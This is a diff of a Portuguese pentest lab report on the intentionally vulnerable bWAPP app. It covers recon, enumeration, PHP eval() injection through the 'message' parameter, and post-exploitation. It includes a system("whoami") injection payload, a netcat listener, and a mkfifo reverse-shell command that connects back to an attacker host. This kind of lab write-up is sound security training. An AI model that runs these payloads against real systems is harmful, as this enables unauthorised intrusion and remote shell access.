@@ -14,12 +14,12 @@ Este documento detalha o teste de invasão realizado na aplicação bWAPP. Foi i
 O teste seguiu as fases padrão de um Pentest profissional:
 
 1.	Reconhecimento e Varredura: Descoberta de ativos e serviços.
-2.	
-3.	Enumeração: Mapeamento de diretórios e arquivos da aplicação.
-4.	
-5.	Análise e Exploração: Identificação e exploração da falha de injeção.
-6.	
-7.	Pós-Exploração: Ganho de acesso interativo (Reverse Shell).
+
+2.	Enumeração: Mapeamento de diretórios e arquivos da aplicação.
+
+3.	Análise e Exploração: Identificação e exploração da falha de injeção.
+
+4.	Pós-Exploração: Ganho de acesso interativo (Reverse Shell).
 
 
 ##DESENVOLVIMENTO TÉCNICO
@@ -50,7 +50,9 @@ Utilizou-se uma ferramenta de fuzzing para encontrar diretórios ocultos na apli
 
 
 ##Identificação da Vulnerabilidade (PHP Injection)
+
 Ao analisar o arquivo phpi.php, verificou-se que o parâmetro message processava entradas do usuário através da função vulnerável eval(). Inserir uma aspa simples (') causou um erro de sintaxe, confirmando a injeção.
+
 •	Payload de Teste: http://192.168.56.103/bwapp/phpi.php?message=system("whoami");
  
  <img width="786" height="328" alt="image" src="https://github.com/user-attachments/assets/b1a058ed-dd69-4c24-ab5a-d56c6100ec52" />
@@ -68,13 +70,16 @@ Ao analisar o arquivo phpi.php, verificou-se que o parâmetro message processava
 
 
 ##Exploração e Ganho de Acesso (Reverse Shell)
+
 Para transformar a execução de comandos em um terminal interativo, foi configurado um Reverse Shell utilizando a técnica de mkfifo.
+
 Passo 1: Preparação do Receptor (Kali) No terminal do atacante, abriu-se uma porta para escuta: nc -nvlp 4444
 
  <img width="394" height="116" alt="image" src="https://github.com/user-attachments/assets/acac2f7c-d6ba-43eb-8f7e-582737f62626" />
 
 
 Passo 2: Criação e Codificação do Payload Utilizou-se o site RevShells para gerar o código de conexão reversa e aplicou-se URL Encoding para garantir que o navegador transmitisse os caracteres especiais (como |, ;, &) sem erros.
+
 •	Código Bruto: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.56.101 4444 >/tmp/f
 	 
  <img width="886" height="238" alt="image" src="https://github.com/user-attachments/assets/c91f9198-fa8d-48be-9ef1-aa80ce4d6d83" />
@@ -88,7 +93,9 @@ Passo 2: Criação e Codificação do Payload Utilizou-se o site RevShells para 
 
 
 ##Prova de Conceito (PoC)
+
 Ao submeter o payload encodado via URL, o servidor bWAPP conectou-se de volta ao Kali Linux, entregando um shell interativo.
+
 •	Confirmação: Execução dos comandos id e hostname dentro do servidor invadido.
 
  <img width="886" height="47" alt="image" src="https://github.com/user-attachments/assets/78f7c410-b47a-4007-9296-6024939c5ad3" />
